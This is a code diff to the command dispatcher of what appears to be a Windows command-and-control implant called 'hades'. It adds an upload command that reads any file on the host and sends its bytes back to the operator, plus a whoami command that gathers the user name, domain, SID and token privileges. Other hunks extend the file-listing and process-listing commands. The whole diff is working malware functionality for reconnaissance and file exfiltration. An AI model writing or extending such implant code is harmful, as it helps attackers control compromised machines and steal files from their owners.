@@ -7,20 +7,7 @@
 		cleanup do_ls and do_getprivs, also make output prettier
 */
 
-enum CMD_ACTION_CODES {
-	CMD_CODE_PS,
-	CMD_CODE_CMD,
-	CMD_CODE_CAT,
-	CMD_CODE_LS,
-	CMD_CODE_RM,
-	CMD_CODE_MV,
-	CMD_CODE_PWD,
-	CMD_CODE_CD,
-	CMD_CODE_CP,
-	CMD_CODE_RMDIR,
-	CMD_CODE_GETPRIVS,
-	CMD_CODE_MKDIR,
-};
+
 
 
 
@@ -62,16 +49,16 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 		case CMD_CODE_RMDIR:
 			do_rmdir();
 			break;
-		case CMD_CODE_MKDIR:
-			do_mkdir();
-			break;
 
 		case CMD_CODE_RM:
 			do_rm();
 			break;
 
-		case CMD_CODE_GETPRIVS:
-			do_getprivs();
+		case CMD_CODE_WHOAMI:
+			do_whoami();
+			break;
+		case CMD_CODE_UPLOAD:
+			do_upload();
 			break;
 		default:
 			break;
@@ -83,88 +70,176 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 }
 
 
+void commanders::do_upload() {
+	HANDLE hFile = NULL;
+	PBYTE buf = NULL;
 
-void commanders::do_getprivs() {
-	PTOKEN_PRIVILEGES TokenPrivs = NULL;
-	PCHAR buf					 = NULL;
-	HANDLE hToken				 = NULL;
+	ULONGLONG size = 0;
+	DWORD high = 0;
+	DWORD low = 0;
+	DWORD chunksize = 12 * 1024;
+	DWORD BytesRead = 0;
 
-	ULONG size      = 0;
-	NTSTATUS Stat   = 0;
-	DWORD StatusLen = 0;
-	DWORD TotalSize = 0;
-	DWORD capacity  = 0;
-	
+	UINT TaskID = g_ByteMgr->BeginTask();
 
+	UINT FileStrLen = g_ByteMgr->Read4();
+	PCHAR File = g_ByteMgr->ReadString(FileStrLen);
 
-	g_ByteMgr->BeginTask();
-	
-	Stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
-	if (!NTAPI_SUCCESS(Stat)) {
-		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
-		return;
-	}
-
-	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &size);
-	TokenPrivs = AllocMemory<TOKEN_PRIVILEGES>(size);
-	if (!TokenPrivs) {
-		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+	hFile = hades->WinApis.CreateFileA(File, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
 
-	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivs, size, &size);
-	if (!NTAPI_SUCCESS(Stat)) {
-		g_ByteMgr->EndErr(ERROR_FAILED_TOKENS);
-		return;
+	low = GetFileSize(hFile, &high);
+	if (low == INVALID_FILE_SIZE && GetTeb()->LastErrorValue != NO_ERROR) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
 	}
 
-	
-	capacity = TokenPrivs->PrivilegeCount * 300;
-	buf = AllocMemory<CHAR>(capacity);
+	size = ((ULONGLONG)high << 32) | low;
+
+	buf = AllocMemory<BYTE>(chunksize);
 	if (!buf) {
 		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
 		goto CLEANUP;
 	}
 
+	if (!hades->WinApis.ReadFile(hFile, buf, chunksize, &BytesRead, NULL)) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+
+	g_ByteMgr->Write4(STATUS_OK);
+	g_ByteMgr->Write4(TASK_TYPE_UPLOAD);
+
+	if (size > chunksize) {
+		g_ByteMgr->Write4(UPLOAD_CHUNKED);
+		//g_ByteMgr->Write8(size);
+		g_ByteMgr->Write4(BytesRead);
+		g_ByteMgr->WriteString(buf, BytesRead);
+
+		/*if (!g_FileMgr->InsertTask(TaskID, hFile)) {
+			g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+			goto CLEANUP;
+		}*/
+
+		hFile = NULL; // FileMgr owns it now.
+	}
+	else {
+		g_ByteMgr->Write4(UPLOAD_NO_CHUNKED);
+		//g_ByteMgr->Write8(size);
+		g_ByteMgr->Write4(BytesRead);
+		g_ByteMgr->WriteString(buf, BytesRead);
+	}
+
+CLEANUP:
+	if (File) { g_ByteMgr->FreeString(File); }
+	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
+	if (hFile && hFile != INVALID_HANDLE_VALUE) { hades->WinApis.CloseHandle(hFile); }
+}
+
+
+void commanders::do_whoami() {
+	PTOKEN_PRIVILEGES TokenPrivs = NULL;
+	PCHAR buf                    = NULL;
+	HANDLE hToken                = NULL;
+	PTOKEN_USER TokenUsr         = NULL;
+	LPSTR SidStr				 = NULL;
+	SID_NAME_USE sidType;
+	NTSTATUS Stat;
+
+	CHAR NameBuf[256]   = { 0 };
+	CHAR DomainBuf[256] = { 0 };
+	DWORD NameLen       = 256;
+	DWORD DomainLen     = 256;
+	DWORD TokenUsrSize  = 0;
+	DWORD TokenPrivSize = 0;
+	DWORD SidLen		= 0;
+
+
+
+	g_ByteMgr->BeginTask();
+
+	Stat = hades->NtApis.NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
+	if (!NTAPI_SUCCESS(Stat)) {
+		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
+		goto CLEANUP;
+	}
+
+	hades->NtApis.NtQueryInformationToken(hToken, TokenUser, NULL, 0, &TokenUsrSize);
+	TokenUsr = AllocMemory<TOKEN_USER>(TokenUsrSize);
+	if (!TokenUsr) {
+		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+		goto CLEANUP;
+	}
+
+	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenUser, TokenUsr, TokenUsrSize, &TokenUsrSize);
+	if (!NTAPI_SUCCESS(Stat)) {
+		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
+		goto CLEANUP;
+	}
+
+
+	if (!hades->WinApis.ConvertSidToStringSidA(TokenUsr->User.Sid, &SidStr)) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+
+	if (!hades->WinApis.LookupAccountSidA(NULL, TokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
+		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+		goto CLEANUP;
+	}
+
+	hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, NULL, 0, &TokenPrivSize);
+	TokenPrivs = AllocMemory<TOKEN_PRIVILEGES>(TokenPrivSize);
+	if (!TokenPrivs) {
+		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+		goto CLEANUP;
+	}
+
+	Stat = hades->NtApis.NtQueryInformationToken(hToken, TokenPrivileges, TokenPrivs, TokenPrivSize, &TokenPrivSize);
+	if (!NTAPI_SUCCESS(Stat)) {
+		g_ByteMgr->EndErr(ERROR_TOKEN_SIZE);
+		goto CLEANUP;
+	}
+
 	g_ByteMgr->Write4(STATUS_OK);
 	g_ByteMgr->Write4(TASK_TYPE_GETPRIVS);
-	g_ByteMgr->Write4(TokenPrivs->PrivilegeCount);
+	g_ByteMgr->Write4(NameLen);
+	g_ByteMgr->WriteString((PBYTE)NameBuf, NameLen);
+	g_ByteMgr->Write4(DomainLen);
+	g_ByteMgr->WriteString((PBYTE)DomainBuf, DomainLen);
+	SidLen = (DWORD)strlen(SidStr);
+	g_ByteMgr->Write4(SidLen);
+	g_ByteMgr->WriteString((PBYTE)SidStr, SidLen);
+
 	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
-		LUID_AND_ATTRIBUTES Priv = TokenPrivs->Privileges[i];
+		LUID_AND_ATTRIBUTES Privs = TokenPrivs->Privileges[i];
+		CHAR PrivName[256] = { 0 };
+		DWORD PrivNameLen = sizeof(PrivName);
+		DWORD PrivStatus = 0;
+		if (!hades->WinApis.LookupPrivilegeNameA(NULL, &Privs.Luid, PrivName, &PrivNameLen)) {
+			continue;
+		}
+		if (Privs.Attributes & SE_PRIVILEGE_REMOVED) PrivStatus = PrivRemoved;
+		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED) PrivStatus = PrivEnabled;
+		else if (Privs.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) PrivStatus = PrivEnabledByDefault;
+		else PrivStatus = PrivDisabled;
 
-		CHAR name[256] = { 0 };
-		DWORD NameLne = sizeof(name);
-		if (!hades->WinApis.LookupPrivilegeNameA(NULL, &Priv.Luid, name, &NameLne)) {
-			g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
-			goto CLEANUP;
-		}
-
-		const char* Status;
-		if (Priv.Attributes & SE_PRIVILEGE_REMOVED) {
-			Status = "Removed"; StatusLen = 7;
-		}
-		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED) {
-			Status = "Enabled"; StatusLen = 7;
-		}
-		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT) {
-			Status = "Enabled by Default"; StatusLen = 18;
-		}
-		else {
-			Status = "Disabled"; StatusLen = 8;
-		}
-		g_ByteMgr->Write4(NameLne);
-		g_ByteMgr->WriteString((PBYTE)name, NameLne);
-		g_ByteMgr->Write4(StatusLen);
-		g_ByteMgr->WriteString((PBYTE)Status, StatusLen);
-
+		g_ByteMgr->Write4(PrivNameLen);
+		g_ByteMgr->WriteString((PBYTE)PrivName, PrivNameLen);
+		g_ByteMgr->Write4(PrivStatus);
 	}
-	
+
+	g_ByteMgr->Write4(END_SIG);
+
 CLEANUP:
-	
-	if (TokenPrivs)   { HeapFree(GetProcessHeap(), 0, TokenPrivs); }
-	if (buf)          { HeapFree(GetProcessHeap(), 0, buf);        }
-	if (hToken)       { hades->WinApis.CloseHandle(hToken);        }
-	return;
+	if (TokenPrivs) { HeapFree(GetProcessHeap(), 0, TokenPrivs); }
+	if (TokenUsr) { HeapFree(GetProcessHeap(), 0, TokenUsr); }
+	if (SidStr) { LocalFree(SidStr); }
+	if (hToken) { hades->WinApis.CloseHandle(hToken); }
+
 }
 
 
@@ -228,11 +303,18 @@ void commanders::do_ls() {
 
 	UINT len = g_ByteMgr->Read4();
 	PCHAR Dir = g_ByteMgr->ReadString(len);
+
+
 	
-	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
-	path[PathSize] = '\\';
-	path[++PathSize] = '*';
-	path[++PathSize] = '\0';
+	PathSize = hades->WinApis.GetFullPathNameA(Dir, MAX_PATH, path, NULL);
+	DWORD attrs = hades->WinApis.GetFileAttributesA(Dir);
+	BOOL file = (attrs != INVALID_FILE_ATTRIBUTES) && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
+	if (!file) {
+		path[PathSize] = '\\';
+		path[++PathSize] = '*';
+		path[++PathSize] = '\0';
+	}
+	
 
 	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
 	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
@@ -262,7 +344,8 @@ void commanders::do_ls() {
 		g_ByteMgr->WriteString((PBYTE)FindData.cFileName, len);
 		g_ByteMgr->Write4(typeLen);
 		g_ByteMgr->WriteString((PBYTE)type, typeLen);
-		
+		ULONGLONG size = ((ULONGLONG)FindData.nFileSizeHigh << 32) | FindData.nFileSizeLow;
+		g_ByteMgr->Write8(size);
 
 	} while (hades->WinApis.FindNextFileA(hFind, &FindData));
 
@@ -423,13 +506,14 @@ void commanders::do_ps() {
 	HANDLE hProc = NULL;
 	HANDLE hToken = NULL;
 
-	PBYTE buf    = NULL;
-	PBYTE OutBuf = NULL;
+	CHAR NameBuf[256];
+	CHAR DomainBuf[256];
+	DWORD NameLen = 256;
+	DWORD DomainLen = 256;
 
-	DWORD capacity = BASE_BUFFER_SIZE;
+	PBYTE buf    = NULL;
 	DWORD needed = 0;
 	DWORD PID = 0;
-	INT pidlen = 0;
 	INT len = 0;
 
 	const char* owner = "N/A";
@@ -458,7 +542,8 @@ void commanders::do_ps() {
 	g_ByteMgr->Write4(TASK_PS_LIST);
 	while (TRUE) {
 		CHAR line[512] = { 0 };
-		DWORD pos = 0;
+		const char* owner = "N/A";
+		DWORD ownerLen = 3;
 		if (!spi->ImageName.Buffer) {
 			goto NEXT_ENTRY;
 		} 
@@ -478,10 +563,6 @@ void commanders::do_ps() {
 				PTOKEN_USER tokenUsr = AllocMemory<TOKEN_USER>(needed);
 
 				if (hades->WinApis.GetTokenInformation(hToken, TokenUser, tokenUsr, needed, &needed)) {
-					CHAR NameBuf[256];
-					CHAR DomainBuf[256];
-					DWORD NameLen = 256;
-					DWORD DomainLen = 256;
 
 					SID_NAME_USE sidType;
 					if (hades->WinApis.LookupAccountSidA(NULL, tokenUsr->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType)) {
@@ -495,6 +576,8 @@ void commanders::do_ps() {
 			}
 			hades->WinApis.CloseHandle(hProc);
 		}
+
+		// todo handle domain
 		g_ByteMgr->Write4(len);
 		g_ByteMgr->WriteString((PBYTE)line, len);
 		g_ByteMgr->Write4(ownerLen);
